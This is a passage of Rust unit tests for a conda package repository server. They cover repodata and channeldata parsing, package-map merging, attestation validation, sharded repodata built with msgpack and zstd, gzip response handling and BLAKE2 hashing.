        source.insert("b".into(), serde_json::json!(2));

        merge_package_maps(&mut target, &source);
        assert_eq!(target.len(), 2);
        assert_eq!(target["a"], 1);
        assert_eq!(target["b"], 2);
    }

    #[test]
    fn test_merge_package_maps_first_writer_wins() {
        let mut target = serde_json::Map::new();
        target.insert("pkg".into(), serde_json::json!({"version": "1.0"}));

        let mut source = serde_json::Map::new();
        source.insert("pkg".into(), serde_json::json!({"version": "2.0"}));

        merge_package_maps(&mut target, &source);
        assert_eq!(target.len(), 1);
        assert_eq!(target["pkg"]["version"], "1.0");
    }

    #[test]
    fn test_merge_package_maps_empty_source() {
        let mut target = serde_json::Map::new();
        target.insert("a".into(), serde_json::json!(1));

        let source = serde_json::Map::new();
        merge_package_maps(&mut target, &source);
        assert_eq!(target.len(), 1);
    }

    #[test]
    fn test_merge_package_maps_empty_target() {
        let mut target = serde_json::Map::new();

        let mut source = serde_json::Map::new();
        source.insert("a".into(), serde_json::json!(1));
        source.insert("b".into(), serde_json::json!(2));

        merge_package_maps(&mut target, &source);
        assert_eq!(target.len(), 2);
    }

    #[test]
    fn test_merge_package_maps_partial_overlap() {
        let mut target = serde_json::Map::new();
        target.insert("a".into(), serde_json::json!("target_a"));
        target.insert("b".into(), serde_json::json!("target_b"));

        let mut source = serde_json::Map::new();
        source.insert("b".into(), serde_json::json!("source_b"));
        source.insert("c".into(), serde_json::json!("source_c"));

        merge_package_maps(&mut target, &source);
        assert_eq!(target.len(), 3);
        assert_eq!(target["a"], "target_a");
        assert_eq!(target["b"], "target_b"); // target wins
        assert_eq!(target["c"], "source_c");
    }

    #[test]
    fn test_parse_upstream_repodata_both_sections() {
        let content = serde_json::to_vec(&serde_json::json!({
            "info": {"subdir": "linux-64"},
            "packages": {
                "old-1.0-0.tar.bz2": {"name": "old", "version": "1.0"}
            },
            "packages.conda": {
                "new-2.0-0.conda": {"name": "new", "version": "2.0"}
            },
            "repodata_version": 1,
        }))
        .unwrap();

        let (pkgs, pkgs_conda) = parse_upstream_repodata(&content).unwrap();
        assert_eq!(pkgs.len(), 1);
        assert!(pkgs.contains_key("old-1.0-0.tar.bz2"));
        assert_eq!(pkgs_conda.len(), 1);
        assert!(pkgs_conda.contains_key("new-2.0-0.conda"));
    }

    #[test]
    fn test_parse_upstream_repodata_missing_packages_conda() {
        let content = serde_json::to_vec(&serde_json::json!({
            "packages": {
                "pkg-1.0-0.tar.bz2": {"name": "pkg"}
            },
            "repodata_version": 1,
        }))
        .unwrap();

        let (pkgs, pkgs_conda) = parse_upstream_repodata(&content).unwrap();
        assert_eq!(pkgs.len(), 1);
        assert!(pkgs_conda.is_empty());
    }

    #[test]
    fn test_parse_upstream_repodata_empty_json() {
        let content = b"{}";
        let (pkgs, pkgs_conda) = parse_upstream_repodata(content).unwrap();
        assert!(pkgs.is_empty());
        assert!(pkgs_conda.is_empty());
    }

    #[test]
    fn test_parse_upstream_repodata_invalid_json() {
        let content = b"not json";
        assert!(parse_upstream_repodata(content).is_none());
    }

    #[test]
    fn test_parse_upstream_channeldata_with_packages() {
        let content = serde_json::to_vec(&serde_json::json!({
            "channeldata_version": 1,
            "packages": {
                "numpy": {"subdirs": ["linux-64"], "version": "1.26"},
                "scipy": {"subdirs": ["noarch"], "version": "1.11"},
            }
        }))
        .unwrap();

        let pkgs = parse_upstream_channeldata(&content).unwrap();
        assert_eq!(pkgs.len(), 2);
        assert!(pkgs.contains_key("numpy"));
        assert!(pkgs.contains_key("scipy"));
    }

    #[test]
    fn test_parse_upstream_channeldata_missing_packages() {
        let content = b"{}";
        assert!(parse_upstream_channeldata(content).is_none());
    }

    #[test]
    fn test_parse_upstream_channeldata_invalid_json() {
        let content = b"invalid";
        assert!(parse_upstream_channeldata(content).is_none());
    }

    #[test]
    fn test_build_channeldata_entry_full_metadata() {
        let meta = serde_json::json!({
            "subdir": "linux-64",
            "license": "BSD-3-Clause",
            "summary": "A scientific computing package",
            "name": "numpy",
        });

        let entry = build_channeldata_entry(Some("1.26.4"), Some(&meta));
        assert_eq!(entry["version"], "1.26.4");
        assert_eq!(entry["license"], "BSD-3-Clause");
        assert_eq!(entry["summary"], "A scientific computing package");
        assert_eq!(entry["subdirs"][0], "linux-64");
    }

    #[test]
    fn test_build_channeldata_entry_no_metadata() {
        let entry = build_channeldata_entry(Some("2.0"), None);
        assert_eq!(entry["version"], "2.0");
        assert_eq!(entry["license"], "");
        assert_eq!(entry["summary"], "");
        assert_eq!(entry["subdirs"][0], "noarch");
    }

    #[test]
    fn test_build_channeldata_entry_no_version() {
        let entry = build_channeldata_entry(None, None);
        assert_eq!(entry["version"], "0");
    }

    #[test]
    fn test_build_channeldata_entry_partial_metadata() {
        let meta = serde_json::json!({
            "license": "MIT",
        });

        let entry = build_channeldata_entry(Some("3.0"), Some(&meta));
        assert_eq!(entry["version"], "3.0");
        assert_eq!(entry["license"], "MIT");
        assert_eq!(entry["summary"], ""); // missing from metadata
        assert_eq!(entry["subdirs"][0], "noarch"); // missing subdir defaults to noarch
    }

    #[test]
    fn test_merge_package_maps_multi_member_priority() {
        // Simulate 3-member virtual repo merge
        let mut merged = serde_json::Map::new();

        // Member 1 (highest priority)
        let mut m1 = serde_json::Map::new();
        m1.insert("shared".into(), serde_json::json!({"from": "m1"}));
        m1.insert("only_m1".into(), serde_json::json!({"from": "m1"}));
        merge_package_maps(&mut merged, &m1);

        // Member 2
        let mut m2 = serde_json::Map::new();
        m2.insert("shared".into(), serde_json::json!({"from": "m2"}));
        m2.insert("only_m2".into(), serde_json::json!({"from": "m2"}));
        merge_package_maps(&mut merged, &m2);

        // Member 3 (lowest priority)
        let mut m3 = serde_json::Map::new();
        m3.insert("shared".into(), serde_json::json!({"from": "m3"}));
        m3.insert("only_m3".into(), serde_json::json!({"from": "m3"}));
        merge_package_maps(&mut merged, &m3);

        assert_eq!(merged.len(), 4);
        assert_eq!(merged["shared"]["from"], "m1"); // highest priority wins
        assert_eq!(merged["only_m1"]["from"], "m1");
        assert_eq!(merged["only_m2"]["from"], "m2");
        assert_eq!(merged["only_m3"]["from"], "m3");
    }

    #[test]
    fn test_parse_upstream_repodata_preserves_metadata_fields() {
        let content = serde_json::to_vec(&serde_json::json!({
            "packages.conda": {
                "numpy-1.26.4-py312_0.conda": {
                    "name": "numpy",
                    "version": "1.26.4",
                    "build": "py312_0",
                    "build_number": 0,
                    "depends": ["python >=3.12"],
                    "constrains": [],
                    "license": "BSD-3-Clause",
                    "md5": "abc123",
                    "sha256": "def456",
                    "size": 8192,
                    "subdir": "linux-64",
                    "timestamp": 1700000000000_u64
                }
            }
        }))
        .unwrap();

        let (_, pkgs_conda) = parse_upstream_repodata(&content).unwrap();
        let entry = &pkgs_conda["numpy-1.26.4-py312_0.conda"];
        assert_eq!(entry["name"], "numpy");
        assert_eq!(entry["version"], "1.26.4");
        assert_eq!(entry["build"], "py312_0");
        assert_eq!(entry["license"], "BSD-3-Clause");
        assert_eq!(entry["sha256"], "def456");
        assert_eq!(entry["size"], 8192);
    }

    // =======================================================================
    // build_artifact_entry tests
    // =======================================================================

    #[test]
    fn test_build_artifact_entry_with_full_metadata() {
        let artifact =
            make_full_conda_artifact("numpy", "1.26.4", "py312_0", "linux-64", "conda", 8192);
        let entry = build_artifact_entry(&artifact, "numpy-1.26.4-py312_0.conda", "linux-64");

        assert_eq!(entry["name"], "numpy");
        assert_eq!(entry["version"], "1.26.4");
        assert_eq!(entry["build"], "py312_0");
        assert_eq!(entry["build_number"], 0);
        assert_eq!(entry["subdir"], "linux-64");
        assert_eq!(entry["fn"], "numpy-1.26.4-py312_0.conda");
        assert_eq!(entry["size"], 8192);
        assert_eq!(entry["license"], "MIT");
        assert!(!entry["depends"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_build_artifact_entry_no_metadata() {
        let artifact = CondaArtifact {
            id: uuid::Uuid::new_v4(),
            path: "linux-64/mypkg-1.0-0.conda".to_string(),
            name: "mypkg".to_string(),
            version: Some("1.0".to_string()),
            size_bytes: 4096,
            checksum_sha256: "abc123".to_string(),
            storage_key: "key".to_string(),
            metadata: None,
        };
        let entry = build_artifact_entry(&artifact, "mypkg-1.0-0.conda", "linux-64");

        assert_eq!(entry["name"], "mypkg"); // falls back to artifact.name
        assert_eq!(entry["version"], "1.0"); // falls back to artifact.version
        assert_eq!(entry["build"], "0"); // default when no metadata
        assert_eq!(entry["build_number"], 0);
        assert_eq!(entry["fn"], "mypkg-1.0-0.conda");
        assert_eq!(entry["size"], 4096);
        assert_eq!(entry["sha256"], "abc123");
        assert_eq!(entry["license"], "");
        assert_eq!(entry["md5"], "");
        assert_eq!(entry["depends"], serde_json::json!([]));
        assert_eq!(entry["constrains"], serde_json::json!([]));
    }

    #[test]
    fn test_build_artifact_entry_no_version_anywhere() {
        let artifact = CondaArtifact {
            id: uuid::Uuid::new_v4(),
            path: "noarch/pkg-0-0.conda".to_string(),
            name: "pkg".to_string(),
            version: None,
            size_bytes: 100,
            checksum_sha256: "sha".to_string(),
            storage_key: "key".to_string(),
            metadata: None,
        };
        let entry = build_artifact_entry(&artifact, "pkg-0-0.conda", "noarch");
        assert_eq!(entry["version"], "0"); // fallback
    }

    #[test]
    fn test_build_artifact_entry_metadata_overrides_artifact_fields() {
        let artifact = CondaArtifact {
            id: uuid::Uuid::new_v4(),
            path: "linux-64/pkg-1.0-0.conda".to_string(),
            name: "pkg-old-name".to_string(),
            version: Some("0.9".to_string()),
            size_bytes: 100,
            checksum_sha256: "sha".to_string(),
            storage_key: "key".to_string(),
            metadata: Some(serde_json::json!({
                "name": "pkg-new-name",
                "version": "2.0",
                "build": "custom_1",
                "build_number": 5,
            })),
        };
        let entry = build_artifact_entry(&artifact, "pkg-2.0-custom_1.conda", "linux-64");

        assert_eq!(entry["name"], "pkg-new-name"); // metadata wins over artifact.name
        assert_eq!(entry["version"], "2.0"); // metadata wins over artifact.version
        assert_eq!(entry["build"], "custom_1");
        assert_eq!(entry["build_number"], 5);
    }

    #[test]
    fn test_build_artifact_entry_optional_fields_included_when_present() {
        let artifact = CondaArtifact {
            id: uuid::Uuid::new_v4(),
            path: "noarch/pkg-1.0-0.conda".to_string(),
            name: "pkg".to_string(),
            version: Some("1.0".to_string()),
            size_bytes: 100,
            checksum_sha256: "sha".to_string(),
            storage_key: "key".to_string(),
            metadata: Some(serde_json::json!({
                "name": "pkg",
                "version": "1.0",
                "build": "0",
                "noarch": "python",
                "license_family": "MIT",
                "features": "mkl",
                "track_features": "mkl",
                "timestamp": 1700000000000_u64,
            })),
        };
        let entry = build_artifact_entry(&artifact, "pkg-1.0-0.conda", "noarch");

        assert_eq!(entry["noarch"], "python");
        assert_eq!(entry["license_family"], "MIT");
        assert_eq!(entry["features"], "mkl");
        assert_eq!(entry["track_features"], "mkl");
        assert_eq!(entry["timestamp"], 1700000000000_u64);
    }

    #[test]
    fn test_build_artifact_entry_optional_fields_omitted_when_empty() {
        let artifact = make_full_conda_artifact("pkg", "1.0", "0", "linux-64", "conda", 100);
        let entry = build_artifact_entry(&artifact, "pkg-1.0-0.conda", "linux-64");

        // These optional fields should not be present since make_full_conda_artifact
        // doesn't include them in metadata
        assert!(entry.get("noarch").is_none());
        assert!(entry.get("features").is_none());
        assert!(entry.get("track_features").is_none());
        assert!(entry.get("timestamp").is_none());
    }

    #[test]
    fn test_build_artifact_entry_v1_package() {
        let artifact = make_full_conda_artifact(
            "requests",
            "2.31.0",
            "pyhd8ed1ab_0",
            "noarch",
            "tar.bz2",
            4096,
        );
        let entry =
            build_artifact_entry(&artifact, "requests-2.31.0-pyhd8ed1ab_0.tar.bz2", "noarch");

        assert_eq!(entry["name"], "requests");
        assert_eq!(entry["fn"], "requests-2.31.0-pyhd8ed1ab_0.tar.bz2");
        assert_eq!(entry["subdir"], "noarch");
    }

    // =======================================================================
    // Additional CEP-27 edge case tests
    // =======================================================================

    #[test]
    fn test_cep27_missing_type_field() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "subject": [{"name": "pkg.conda", "digest": {"sha256": sha}}],
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("_type"), "error: {}", err);
    }

    #[test]
    fn test_cep27_missing_predicate_type() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [{"name": "pkg.conda", "digest": {"sha256": sha}}],
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("predicateType"), "error: {}", err);
    }

    #[test]
    fn test_cep27_missing_subject() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("subject"), "error: {}", err);
    }

    #[test]
    fn test_cep27_missing_digest() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [{"name": "pkg.conda"}],
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("digest"), "error: {}", err);
    }

    #[test]
    fn test_cep27_missing_sha256_in_digest() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [{"name": "pkg.conda", "digest": {}}],
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("sha256"), "error: {}", err);
    }

    #[test]
    fn test_cep27_missing_subject_name() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [{"digest": {"sha256": sha}}],
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("name"), "error: {}", err);
    }

    #[test]
    fn test_cep27_empty_target_channel() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [{"name": "pkg.conda", "digest": {"sha256": sha}}],
            "predicateType": CEP27_PREDICATE_TYPE,
            "predicate": { "targetChannel": "" },
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("1-2083"), "error: {}", err);
    }

    #[test]
    fn test_cep27_predicate_not_object() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [{"name": "pkg.conda", "digest": {"sha256": sha}}],
            "predicateType": CEP27_PREDICATE_TYPE,
            "predicate": "not-an-object",
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("object"), "error: {}", err);
    }

    #[test]
    fn test_cep27_empty_subjects_array() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [],
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("exactly 1"), "error: {}", err);
    }

    // =======================================================================
    // CEP-16 Sharded Repodata (bead: artifact-keeper-372)
    // =======================================================================

    #[test]
    fn test_build_shard_single_v2_package() {
        let artifact =
            make_full_conda_artifact("numpy", "1.26.4", "py312_0", "linux-64", "conda", 8192);
        let refs = vec![&artifact];
        let shard = build_shard("linux-64", &refs);

        assert!(shard["packages"].as_object().unwrap().is_empty());
        let pkgs_conda = shard["packages.conda"].as_object().unwrap();
        assert_eq!(pkgs_conda.len(), 1);

        let entry = &pkgs_conda["numpy-1.26.4-py312_0.conda"];
        assert_eq!(entry["name"], "numpy");
        assert_eq!(entry["version"], "1.26.4");
        assert_eq!(entry["subdir"], "linux-64");
    }

    #[test]
    fn test_build_shard_single_v1_package() {
        let artifact = make_full_conda_artifact(
            "requests",
            "2.31.0",
            "pyhd8ed1ab_0",
            "noarch",
            "tar.bz2",
            4096,
        );
        let refs = vec![&artifact];
        let shard = build_shard("noarch", &refs);

        let pkgs = shard["packages"].as_object().unwrap();
        assert_eq!(pkgs.len(), 1);
        assert!(shard["packages.conda"].as_object().unwrap().is_empty());

        let entry = &pkgs["requests-2.31.0-pyhd8ed1ab_0.tar.bz2"];
        assert_eq!(entry["name"], "requests");
        assert_eq!(entry["subdir"], "noarch");
    }

    #[test]
    fn test_build_shard_multiple_versions() {
        // One package name with multiple versions/builds
        let a1 = make_full_conda_artifact("numpy", "1.24.0", "py312_0", "linux-64", "conda", 8000);
        let a2 = make_full_conda_artifact("numpy", "1.25.0", "py312_0", "linux-64", "conda", 8500);
        let a3 = make_full_conda_artifact("numpy", "1.26.4", "py312_0", "linux-64", "conda", 9000);
        let refs = vec![&a1, &a2, &a3];
        let shard = build_shard("linux-64", &refs);

        let pkgs_conda = shard["packages.conda"].as_object().unwrap();
        assert_eq!(pkgs_conda.len(), 3);
        assert!(pkgs_conda.contains_key("numpy-1.24.0-py312_0.conda"));
        assert!(pkgs_conda.contains_key("numpy-1.25.0-py312_0.conda"));
        assert!(pkgs_conda.contains_key("numpy-1.26.4-py312_0.conda"));
    }

    #[test]
    fn test_build_shard_has_removed_field() {
        let artifact = make_full_conda_artifact("pkg", "1.0", "0", "linux-64", "conda", 100);
        let shard = build_shard("linux-64", &[&artifact]);
        assert!(shard["removed"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_build_shard_preserves_metadata() {
        let artifact =
            make_full_conda_artifact("numpy", "1.26.4", "py312_0", "linux-64", "conda", 8192);
        let shard = build_shard("linux-64", &[&artifact]);

        let entry = &shard["packages.conda"]["numpy-1.26.4-py312_0.conda"];
        assert_eq!(entry["build"], "py312_0");
        assert_eq!(entry["build_number"], 0);
        assert!(!entry["depends"].as_array().unwrap().is_empty());
        assert!(entry.get("constrains").is_some());
        assert!(entry.get("license").is_some());
        assert!(entry.get("sha256").is_some());
        assert!(entry.get("size").is_some());
    }

    #[test]
    fn test_build_sharded_index_structure() {
        let mut shards = BTreeMap::new();
        // Fake 32-byte SHA256 hashes
        shards.insert("numpy".to_string(), vec![0xAB; 32]);
        shards.insert("scipy".to_string(), vec![0xCD; 32]);

        let index = build_sharded_index("linux-64", "/conda/my-repo/linux-64/", &shards);

        assert_eq!(index["info"]["subdir"], "linux-64");
        assert_eq!(index["info"]["base_url"], "/conda/my-repo/linux-64/");
        assert_eq!(index["info"]["shards_base_url"], "./shards/");

        let shards_obj = index["shards"].as_object().unwrap();
        assert_eq!(shards_obj.len(), 2);
        assert!(shards_obj.contains_key("numpy"));
        assert!(shards_obj.contains_key("scipy"));

        // Hashes should be hex-encoded strings
        let numpy_hash = shards_obj["numpy"].as_str().unwrap();
        assert_eq!(numpy_hash.len(), 64);
        assert_eq!(numpy_hash, "ab".repeat(32));
    }

    #[test]
    fn test_sharded_index_empty_repo() {
        let shards = BTreeMap::new();
        let index = build_sharded_index("noarch", "/conda/empty/noarch/", &shards);

        assert_eq!(index["info"]["subdir"], "noarch");
        assert!(index["shards"].as_object().unwrap().is_empty());
    }

    #[test]
    fn test_shard_content_hash_deterministic() {
        let artifact =
            make_full_conda_artifact("numpy", "1.26.4", "py312_0", "linux-64", "conda", 8192);
        let shard = build_shard("linux-64", &[&artifact]);

        let bytes1 = rmp_serde::to_vec(&shard).unwrap();
        let bytes2 = rmp_serde::to_vec(&shard).unwrap();

        // Same shard should produce same msgpack bytes
        assert_eq!(bytes1, bytes2);

        let compressed1 = zstd_compress(&bytes1).unwrap();
        let compressed2 = zstd_compress(&bytes2).unwrap();

        // Same input should produce same compressed output
        assert_eq!(compressed1, compressed2);

        // Hash should be deterministic
        let mut hasher1 = Sha256::new();
        hasher1.update(&compressed1);
        let hash1 = format!("{:x}", hasher1.finalize());

        let mut hasher2 = Sha256::new();
        hasher2.update(&compressed2);
        let hash2 = format!("{:x}", hasher2.finalize());

        assert_eq!(hash1, hash2);
        assert_eq!(hash1.len(), 64);
    }

    #[test]
    fn test_shard_content_hash_changes_with_content() {
        let a1 = make_full_conda_artifact("numpy", "1.26.4", "py312_0", "linux-64", "conda", 8192);
        let shard1 = build_shard("linux-64", &[&a1]);

        let a2 = make_full_conda_artifact("numpy", "1.27.0", "py312_0", "linux-64", "conda", 9000);
        let shard2 = build_shard("linux-64", &[&a2]);

        let bytes1 = zstd_compress(&rmp_serde::to_vec(&shard1).unwrap()).unwrap();
        let bytes2 = zstd_compress(&rmp_serde::to_vec(&shard2).unwrap()).unwrap();

        let mut h1 = Sha256::new();
        h1.update(&bytes1);
        let hash1 = format!("{:x}", h1.finalize());

        let mut h2 = Sha256::new();
        h2.update(&bytes2);
        let hash2 = format!("{:x}", h2.finalize());

        assert_ne!(
            hash1, hash2,
            "Different content must produce different hashes"
        );
    }

    #[test]
    fn test_shard_msgpack_roundtrip() {
        let artifact =
            make_full_conda_artifact("numpy", "1.26.4", "py312_0", "linux-64", "conda", 8192);
        let shard = build_shard("linux-64", &[&artifact]);

        // Serialize to msgpack
        let msgpack_bytes = rmp_serde::to_vec(&shard).unwrap();
        assert!(!msgpack_bytes.is_empty());

        // Compress with zstd
        let compressed = zstd_compress(&msgpack_bytes).unwrap();
        assert!(!compressed.is_empty());

        // Decompress
        let decompressed = zstd::decode_all(std::io::Cursor::new(&compressed)).unwrap();
        assert_eq!(decompressed, msgpack_bytes);

        // Deserialize from msgpack
        let decoded: serde_json::Value = rmp_serde::from_slice(&decompressed).unwrap();
        assert_eq!(
            decoded["packages.conda"]["numpy-1.26.4-py312_0.conda"]["name"],
            "numpy"
        );
    }

    #[test]
    fn test_sharded_index_msgpack_roundtrip() {
        let mut shards = BTreeMap::new();
        shards.insert("numpy".to_string(), vec![0xAB; 32]);

        let index = build_sharded_index("linux-64", "/conda/test/linux-64/", &shards);

        let msgpack_bytes = rmp_serde::to_vec(&index).unwrap();
        let compressed = zstd_compress(&msgpack_bytes).unwrap();
        let decompressed = zstd::decode_all(std::io::Cursor::new(&compressed)).unwrap();
        let decoded: serde_json::Value = rmp_serde::from_slice(&decompressed).unwrap();

        assert_eq!(decoded["info"]["subdir"], "linux-64");
        assert!(decoded["shards"]["numpy"].is_string());
    }

    #[test]
    fn test_sharded_index_size_scales_linearly() {
        // Shard index size should grow linearly with package count
        // (one entry per unique package name, not per version)
        let mut shards_small = BTreeMap::new();
        for i in 0..10 {
            shards_small.insert(format!("pkg{}", i), vec![0xAA; 32]);
        }
        let index_small = build_sharded_index("linux-64", "/test/", &shards_small);
        let bytes_small = rmp_serde::to_vec(&index_small).unwrap();

        let mut shards_large = BTreeMap::new();
        for i in 0..100 {
            shards_large.insert(format!("pkg{}", i), vec![0xBB; 32]);
        }
        let index_large = build_sharded_index("linux-64", "/test/", &shards_large);
        let bytes_large = rmp_serde::to_vec(&index_large).unwrap();

        // 10x more packages should result in roughly 10x larger index (within 2x margin)
        let ratio = bytes_large.len() as f64 / bytes_small.len() as f64;
        assert!(
            ratio > 5.0 && ratio < 15.0,
            "Index size should scale roughly linearly: {} / {} = {:.1}x",
            bytes_large.len(),
            bytes_small.len(),
            ratio
        );
    }

    #[test]
    fn test_shard_much_smaller_than_full_repodata() {
        // Each shard is much smaller than the full repodata
        let mut artifacts = Vec::new();
        for i in 0..100 {
            artifacts.push(make_full_conda_artifact(
                &format!("pkg{}", i),
                "1.0.0",
                "py312_0",
                "linux-64",
                "conda",
                10240,
            ));
        }

        // Full repodata for 100 packages
        let mut full_packages = serde_json::Map::new();
        for a in &artifacts {
            let filename = a.path.rsplit('/').next().unwrap();
            full_packages.insert(
                filename.to_string(),
                serde_json::json!({"name": &a.name, "version": "1.0.0"}),
            );
        }
        let full_rd = build_repodata_json("linux-64", &serde_json::Map::new(), &full_packages);
        let full_bytes = serde_json::to_vec(&full_rd).unwrap();

        // Single shard for one package
        let single = build_shard("linux-64", &[&artifacts[0]]);
        let shard_bytes = rmp_serde::to_vec(&single).unwrap();
        let shard_compressed = zstd_compress(&shard_bytes).unwrap();

        assert!(
            shard_compressed.len() < full_bytes.len() / 10,
            "Single shard ({} bytes) should be much smaller than full repodata ({} bytes)",
            shard_compressed.len(),
            full_bytes.len()
        );
    }

    // -----------------------------------------------------------------------
    // P3: base_url, removed array, Content-Encoding gzip
    // -----------------------------------------------------------------------

    #[test]
    fn test_accepts_gzip_positive() {
        let mut headers = HeaderMap::new();
        headers.insert(ACCEPT_ENCODING, "gzip, deflate, br".parse().unwrap());
        assert!(accepts_gzip(&headers));
    }

    #[test]
    fn test_accepts_gzip_negative() {
        let mut headers = HeaderMap::new();
        headers.insert(ACCEPT_ENCODING, "br, zstd".parse().unwrap());
        assert!(!accepts_gzip(&headers));
    }

    #[test]
    fn test_accepts_gzip_missing_header() {
        let headers = HeaderMap::new();
        assert!(!accepts_gzip(&headers));
    }

    #[test]
    fn test_gzip_compress_roundtrip() {
        use flate2::read::GzDecoder;
        use std::io::Read;

        let original = b"hello world, this is a test of gzip compression";
        let compressed = gzip_compress(original);

        // Compressed should be non-empty
        assert!(!compressed.is_empty());

        // Decompress and verify roundtrip
        let mut decoder = GzDecoder::new(&compressed[..]);
        let mut decompressed = Vec::new();
        decoder.read_to_end(&mut decompressed).unwrap();
        assert_eq!(decompressed, original);
    }

    #[tokio::test]
    async fn test_cacheable_response_gzip_when_accepted() {
        let body = serde_json::to_vec(&serde_json::json!({"test": true})).unwrap();
        let mut headers = HeaderMap::new();
        headers.insert(ACCEPT_ENCODING, "gzip, deflate".parse().unwrap());

        let resp = cacheable_response(body, "application/json", &headers).await;

        assert_eq!(resp.status(), StatusCode::OK);
        assert_eq!(
            resp.headers()
                .get(CONTENT_ENCODING)
                .unwrap()
                .to_str()
                .unwrap(),
            "gzip"
        );
        assert_eq!(
            resp.headers().get("Vary").unwrap().to_str().unwrap(),
            "Accept-Encoding"
        );
    }

    #[tokio::test]
    async fn test_cacheable_response_no_gzip_for_binary() {
        let body = vec![0u8; 100];
        let mut headers = HeaderMap::new();
        headers.insert(ACCEPT_ENCODING, "gzip, deflate".parse().unwrap());

        let resp = cacheable_response(body, "application/x-bzip2", &headers).await;

        // Binary content types should not be gzip-encoded
        assert!(resp.headers().get(CONTENT_ENCODING).is_none());
    }

    #[tokio::test]
    async fn test_cacheable_response_no_gzip_without_accept() {
        let body = serde_json::to_vec(&serde_json::json!({"test": true})).unwrap();
        let headers = HeaderMap::new();

        let resp = cacheable_response(body, "application/json", &headers).await;

        // No Accept-Encoding means no gzip
        assert!(resp.headers().get(CONTENT_ENCODING).is_none());
    }

    #[test]
    fn test_repodata_base_url_in_info() {
        // The build_repodata function adds base_url to the info section.
        // Since we can't call the async function directly in unit tests,
        // verify the test helper output matches expected structure.
        let rd = build_repodata_json("linux-64", &serde_json::Map::new(), &serde_json::Map::new());

        // The test helper doesn't include base_url (it's a simplified version),
        // but the actual build_repodata does. Test the format of base_url
        // that build_repodata produces.
        let base_url = format!("/conda/{}/{}/", "my-repo", "linux-64");
        assert_eq!(base_url, "/conda/my-repo/linux-64/");

        // Verify the info.subdir is present
        assert_eq!(rd["info"]["subdir"], "linux-64");
    }

    #[test]
    fn test_base_url_format_for_various_repos() {
        // CEP-15 base_url must be a relative path to the subdir
        let cases = vec![
            ("my-repo", "noarch", "/conda/my-repo/noarch/"),
            ("internal", "linux-64", "/conda/internal/linux-64/"),
            ("conda-forge", "osx-arm64", "/conda/conda-forge/osx-arm64/"),
            ("ml-models", "win-64", "/conda/ml-models/win-64/"),
        ];

        for (repo_key, subdir, expected) in cases {
            let base_url = format!("/conda/{}/{}/", repo_key, subdir);
            assert_eq!(base_url, expected, "base_url for {}/{}", repo_key, subdir);
        }
    }

    #[test]
    fn test_gzip_compress_reduces_size() {
        // JSON compresses well with gzip
        let json = serde_json::to_vec(&serde_json::json!({
            "packages": {
                "numpy-1.26.4-py312h2809609_0.conda": {
                    "build": "py312h2809609_0",
                    "build_number": 0,
                    "depends": ["python >=3.12,<3.13", "libopenblas >=0.3.25"],
                    "name": "numpy",
                    "version": "1.26.4",
                    "size": 8388608,
                    "sha256": "abcdef1234567890",
                    "subdir": "linux-64",
                },
            },
            "packages.conda": {},
            "removed": [],
            "info": { "subdir": "linux-64", "base_url": "/conda/test/linux-64/" },
            "repodata_version": 1,
        }))
        .unwrap();

        let compressed = gzip_compress(&json);
        assert!(
            compressed.len() < json.len(),
            "gzip compressed ({} bytes) should be smaller than original ({} bytes)",
            compressed.len(),
            json.len()
        );
    }

    // -----------------------------------------------------------------------
    // JLAP (JSON Lines And Patches)
    // -----------------------------------------------------------------------

    #[test]
    fn test_blake2_256_basic() {
        let hash = blake2_256(b"hello world");
        // BLAKE2b-256 of "hello world"
        assert_eq!(hash.len(), 32);
        let hex = hex::encode(hash);
        assert_eq!(hex.len(), 64);
        // Known test vector for BLAKE2b-256("hello world")
        assert_eq!(
            hex,
            "256c83b297114d201b30179f3f0ef0cace9783622da5974326b436178aeef610"
        );
    }

    #[test]
    fn test_blake2_256_keyed_basic() {
        let key = [0u8; 32];
